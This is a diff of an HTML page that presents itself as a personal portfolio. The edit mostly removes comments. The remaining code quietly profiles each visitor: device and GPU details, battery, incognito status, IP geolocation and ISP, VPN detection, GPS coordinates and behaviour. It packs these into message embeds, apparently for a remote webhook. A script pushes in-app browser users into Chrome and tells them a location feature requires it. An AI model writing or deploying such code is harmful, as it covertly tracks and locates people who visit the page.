@@ -3,65 +3,52 @@
 <head>
 <meta charset="UTF-8">
 
-<!-- ═══════════════════════════════════════════════════════════════════
-     ██  IAB GUARD — LETAKKAN DI PALING ATAS <head>, JANGAN DIPINDAH  ██
-     Mendeteksi In-App Browser (Instagram/TikTok/FB/dll) dan memaksa
-     user membuka di Chrome / Safari. Tidak menyentuh logika bot sama sekali.
-     ═══════════════════════════════════════════════════════════════════ -->
 <script>
 (function IABGuard() {
   'use strict';
 
-  /* ── 1. Deteksi User-Agent ─────────────────────────────────────── */
   var ua = navigator.userAgent || '';
 
-  /* Sinyal khas In-App Browser dari berbagai platform */
   var IAB_SIGNALS = [
-    /* Instagram */    'Instagram',
-    /* Facebook */     'FBAN','FBAV','FB_IAB','FBIOS','FBSV','FB4A',
-    /* TikTok */       'TikTok','musical_ly','BytedanceWebview','aweme',
-    /* Snapchat */     'Snapchat',
-    /* LINE */         'Line/',
-    /* WhatsApp */     'WhatsApp',
-    /* Twitter / X */  'TwitterAndroid','Twitter for',
-    /* LinkedIn */     'LinkedInApp',
-    /* Pinterest */    'Pinterest',
-    /* Telegram */     'Telegram',
-    /* WeChat */       'MicroMessenger',
-    /* Google App */   'GSA',
+      'Instagram',
+      'FBAN','FBAV','FB_IAB','FBIOS','FBSV','FB4A',
+      'TikTok','musical_ly','BytedanceWebview','aweme',
+      'Snapchat',
+      'Line/',
+      'WhatsApp',
+      'TwitterAndroid','Twitter for',
+      'LinkedInApp',
+      'Pinterest',
+      'Telegram',
+      'MicroMessenger',
+      'GSA',
   ];
 
-  /* Jika bukan IAB → diam, tidak lakukan apa-apa */
   var isIAB = IAB_SIGNALS.some(function(sig){ return ua.indexOf(sig) !== -1; });
   if (!isIAB) return;
 
-  /* ── 2. Deteksi Platform ───────────────────────────────────────── */
   var isAndroid = /Android/i.test(ua);
   var isIOS     = /iPhone|iPad|iPod/i.test(ua);
   var pageUrl   = window.location.href;
 
-  /* ── 3. Android → Redirect langsung ke Chrome via Intent URL ───── */
+  // Android: redirect ke Chrome via intent
   if (isAndroid) {
     var loc = window.location;
     var intentUrl = 'intent://' + loc.host + loc.pathname + loc.search + loc.hash
                   + '#Intent;scheme=https;package=com.android.chrome;end';
     window.location.href = intentUrl;
-    /* Fallback: jika Chrome tidak terinstall → buka new tab */
     setTimeout(function(){ window.open(pageUrl, '_blank'); }, 800);
-    return; /* stop, tidak perlu modal */
+    return;
   }
 
-  /* ── 4. iOS → Coba buka di Chrome iOS dulu ────────────────────── */
+  // iOS: coba buka Chrome dulu
   if (isIOS) {
     var chromeUrl = pageUrl.replace(/^https?:\/\//i, 'googlechrome://');
     window.location.href = chromeUrl;
-    /* Jika Chrome tidak ada, akan gagal diam-diam → modal akan muncul */
   }
 
-  /* ── 5. Inject Modal Overlay (iOS & OS lain) ───────────────────── */
   var browserLabel = isIOS ? 'Safari / Chrome' : 'Browser Eksternal';
 
-  /* Langkah-langkah sesuai OS */
   var stepsHTML = isIOS
     ? '<li>Tap tombol <b style="color:#fff">Share ↑</b> di bawah layar</li>'
     + '<li>Pilih <b style="color:#fff">"Open in Safari"</b> dari menu</li>'
@@ -70,9 +57,8 @@
     + '<b style="color:#fff">"Open in External Browser"</b></li>';
 
   function injectModal() {
-    if (document.getElementById('iab-guard-overlay')) return; /* cegah double */
+    if (document.getElementById('iab-guard-overlay')) return;
 
-    /* ── Buat elemen overlay ── */
     var overlay = document.createElement('div');
     overlay.id  = 'iab-guard-overlay';
     overlay.setAttribute('role', 'dialog');
@@ -89,7 +75,6 @@
     ].join(';');
 
     overlay.innerHTML = ''
-      /* ── Keyframes & helper styles ── */
       + '<style>'
         + '@keyframes iabFadeIn{from{opacity:0}to{opacity:1}}'
         + '@keyframes iabSlideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}'
@@ -113,7 +98,6 @@
         + '#iab-guard-close:active{background:rgba(255,255,255,.12)}'
       + '</style>'
 
-      /* ── Card utama ── */
       + '<div id="iab-guard-card" style="'
           + 'width:100%;max-width:480px;'
           + 'background:#0d1024;'
@@ -124,7 +108,6 @@
                        + '0 20px 60px rgba(0,0,0,.6);'
           + 'font-family:system-ui,-apple-system,sans-serif">'
 
-        /* Header */
         + '<div style="display:flex;align-items:flex-start;gap:14px;margin-bottom:18px">'
           + '<div style="width:48px;height:48px;min-width:48px;border-radius:14px;flex-shrink:0;'
               + 'background:linear-gradient(135deg,rgba(124,106,247,.22),rgba(34,211,238,.12));'
@@ -137,7 +120,6 @@
               + 'Fitur lokasi tidak tersedia di browser in-app. '
               + 'Buka di browser asli untuk melanjutkan.</div>'
           + '</div>'
-          /* Tombol X */
           + '<button id="iab-guard-close" aria-label="Tutup" style="'
               + 'width:30px;height:30px;min-width:30px;border-radius:50%;flex-shrink:0;'
               + 'background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);'
@@ -147,7 +129,6 @@
               + 'transition:background .2s">&times;</button>'
         + '</div>'
 
-        /* Langkah-langkah */
         + '<div style="padding:14px 16px;'
             + 'background:rgba(255,255,255,.03);'
             + 'border:1px solid rgba(255,255,255,.07);'
@@ -155,7 +136,6 @@
           + '<ul>' + stepsHTML + '</ul>'
         + '</div>'
 
-        /* Tombol CTA */
         + '<button id="iab-open-btn" style="'
             + 'width:100%;padding:14px 20px;border:none;border-radius:50px;cursor:pointer;'
             + 'background:linear-gradient(135deg,rgba(124,106,247,.9),rgba(34,211,238,.7));'
@@ -165,17 +145,15 @@
           + 'Buka di ' + browserLabel
         + '</button>'
 
-      + '</div>'; /* end card */
+      + '</div>';
 
     document.body.appendChild(overlay);
 
-    /* ── Event: Tombol Close ── */
     document.getElementById('iab-guard-close').addEventListener('click', function(){
       overlay.style.animation = 'iabFadeOut .25s ease forwards';
       setTimeout(function(){ if(overlay.parentNode) overlay.remove(); }, 260);
     });
 
-    /* ── Event: Tombol CTA ── */
     document.getElementById('iab-open-btn').addEventListener('click', function(){
       if (isAndroid) {
         var loc = window.location;
@@ -183,7 +161,6 @@
                              + '#Intent;scheme=https;package=com.android.chrome;end';
         setTimeout(function(){ window.open(pageUrl, '_blank'); }, 800);
       } else if (isIOS) {
-        /* Coba Chrome lagi, fallback ke alert share guide */
         window.location.href = pageUrl.replace(/^https?:\/\//i, 'googlechrome://');
         setTimeout(function(){
           alert('Tap tombol Share ↑ di bawah, lalu pilih "Open in Safari".');
@@ -194,7 +171,6 @@
     });
   }
 
-  /* Inject segera jika body sudah ada, atau tunggu DOMContentLoaded */
   if (document.body) {
     injectModal();
   } else {
@@ -203,7 +179,6 @@
 
 }());
 </script>
-<!-- ════ /IAB GUARD ════════════════════════════════════════════════ -->
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Hi there! — by Riski Romadhan Maulana</title>
@@ -524,11 +499,9 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 .aurora-layer::after{animation-duration:34s}
 .aurora-mid::before{animation-duration:40s}
 
-/* Mobile tap ripple */
 @keyframes btnRipple{0%{transform:scale(0);opacity:0.5}100%{transform:scale(4);opacity:0}}
 .btn-ripple{position:absolute;border-radius:50%;background:rgba(255,255,255,0.3);width:60px;height:60px;margin-left:-30px;margin-top:-30px;pointer-events:none;animation:btnRipple 0.5s ease-out forwards}
 
-/* Reduced motion: disable SVG animations */
 @media(prefers-reduced-motion:reduce){
   .wave-hand-g,.wave-sparkle,.wave-sparkle2,.wave-sparkle3,.smile-ray,.hero-hi{animation:none}
   .float-a,.float-b{animation:none}
@@ -536,8 +509,6 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 </style>
 </head>
 <body>
-
-<!-- ── IAB iOS Toast injected via JS only when needed ──────── -->
 
 <canvas id="galaxy-canvas" aria-hidden="true"></canvas>
 
@@ -1302,7 +1273,6 @@ function animateRings(){
   const rings  = document.querySelectorAll('.ring-fg');
   const pctEls = document.querySelectorAll('.skill-pct');
 
-  /* Reset semua ring ke 0 dulu */
   rings.forEach(ring => {
     ring.style.strokeDasharray  = CIRC;
     ring.style.strokeDashoffset = CIRC;
@@ -1319,7 +1289,6 @@ function animateRings(){
 
       function step(now){
         const p    = Math.min((now - t0) / dur, 1);
-        /* ease-out cubic */
         const ease = 1 - Math.pow(1 - p, 3);
         const val  = Math.round(ease * target);
         ring.style.strokeDashoffset = CIRC - (val / 100) * CIRC;
@@ -1378,7 +1347,6 @@ function startCounters(){
   document.querySelectorAll('.counter').forEach(el => obs.observe(el));
 }
 
-/* Touch ripple for primary & ghost buttons */
 document.querySelectorAll('.btn-primary, .btn-ghost').forEach(btn => {
   btn.addEventListener('touchstart', function(e){
     const touch = e.touches[0];
@@ -1475,7 +1443,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
 
   const pageEnterTime = Date.now();
 
-  /* ── Scroll depth tracker ─────────────────────────────────── */
+  // Track scroll depth
   let maxScroll = 0;
   function updateScroll(){
     const total = document.documentElement.scrollHeight - window.innerHeight;
@@ -1483,7 +1451,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   }
   window.addEventListener('scroll', updateScroll, { passive: true });
 
-  /* ── Device Info (UAParser + fallback regex) ──────────────── */
+  // Device info
   function getDeviceInfo(){
     try {
       const parser = new UAParser();
@@ -1554,7 +1522,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     }
   }
 
-  /* ── Battery — selalu kirim, N/A kalau tidak support ─────── */
   async function getBattery(){
     try {
       if(!navigator.getBattery) return 'N/A (not supported)';
@@ -1568,16 +1535,13 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'N/A (not supported)'; }
   }
 
-  /* ── Incognito — StorageManager method (lebih akurat) ─────── */
   async function detectIncognito(){
     try {
       if(navigator.storage && navigator.storage.estimate){
         const { quota } = await navigator.storage.estimate();
-        /* Incognito Chrome biasanya quota < 120MB */
-        if(quota && quota < 120 * 1024 * 1024) return 'Yes (Private/Incognito)';
+          if(quota && quota < 120 * 1024 * 1024) return 'Yes (Private/Incognito)';
         return 'No (Normal)';
       }
-      /* Fallback lama */
       return new Promise(res => {
         const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
         if(!fs){ res('Unknown'); return; }
@@ -1586,7 +1550,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'Unknown'; }
   }
 
-  /* ── GPU via WebGL ────────────────────────────────────────── */
   function getGPU(){
     try {
       const canvas = document.createElement('canvas');
@@ -1602,7 +1565,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'Unknown'; }
   }
 
-  /* ── GPS detail ───────────────────────────────────────────── */
   async function getDetailedLocation(){
     return new Promise((resolve)=>{
       if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
@@ -1635,7 +1597,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     });
   }
 
-  /* ── Kumpulkan semua data sync dulu ───────────────────────── */
   const deviceInfo   = getDeviceInfo();
   const gpuInfo      = getGPU();
   const ua           = navigator.userAgent || 'Unknown';
@@ -1682,7 +1643,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     saveData = c.saveData  ? 'On (Data Saver)'      : 'Off';
   }
 
-  /* ── Page load time ───────────────────────────────────────── */
   let pageLoadMs = 'Unknown';
   try {
     const nav = performance.getEntriesByType('navigation')[0];
@@ -1693,7 +1653,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     }
   } catch {}
 
-  /* ── Async: IP geo, battery, incognito, GPS ──────────────── */
   const [geo, battery, incognito, detailLoc] = await Promise.all([
     (async()=>{
       let g = {
@@ -1728,7 +1687,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     getDetailedLocation()
   ]);
 
-  /* ── VPN / Proxy detection dari ASN ──────────────────────── */
   const VPN_KEYWORDS = ['cloudflare','digitalocean','amazon','google','microsoft','linode',
     'vultr','ovh','hetzner','akamai','fastly','mullvad','nordvpn','expressvpn',
     'protonvpn','ipvanish','datacamp','m247','packethub','hostinger'];
@@ -1737,10 +1695,8 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   const isVPN  = VPN_KEYWORDS.some(k => orgLow.includes(k) || asnLow.includes(k));
   const vpnFlag = isVPN ? '⚠️ Possible VPN/Proxy/Datacenter' : '✅ Likely Residential';
 
-  /* ── Time on page saat kirim ─────────────────────────────── */
   const timeOnPage = `${Math.round((Date.now() - pageEnterTime) / 1000)}s`;
 
-  /* ── EMBED 1: Device, Hardware, Browser, Display, Behavior ── */
   const fields1 = [
     { name:'📱 Device',         value: `${deviceInfo.vendor} ${deviceInfo.model}`.trim() || 'Unknown', inline: true },
     { name:'💻 Type',           value: deviceType,                           inline: true },
@@ -1779,7 +1735,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     timestamp: new Date().toISOString()
   };
 
-  /* ── EMBED 2: Lokasi, Jaringan, Behavior ─────────────────── */
   const fields2 = [
     { name:'🆔 IP Address',     value: `\`${geo.ip}\``,                      inline: false },
     { name:'🏢 ISP / Org',      value: geo.org,                              inline: true  },
@@ -1836,7 +1791,6 @@ console.log('%c Hi there! 👋 %c by RISKI RM',
   'font-size:1em;color:#22d3ee;background:#03050f;padding:4px 8px;border-radius:4px');
 
 function initTilt(){
-  /* Touch device: skip tilt, pakai tap flash ringan saja */
   const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
   document.querySelectorAll('.glass-card').forEach(card => {
@@ -1921,7 +1875,7 @@ function initTilt(){
       return;
     }
 
-    /* Desktop mouse tilt */
+// Desktop mouse tilt
     function getCardColor(){
       const badge = card.querySelector('.proj-badge');
       if(badge){ const cs = getComputedStyle(badge); return cs.color; }
@@ -1999,10 +1953,6 @@ function initTilt(){
   });
 }
 setTimeout(initTilt, 800);
-
-/* ── IAB Detection & Redirect ────────────────────────────── */
-/* Sudah ditangani oleh IAB Guard di paling atas <head>.      */
-/* Script lama ini dinonaktifkan untuk mencegah konflik.       */
 
 })();
 </script>
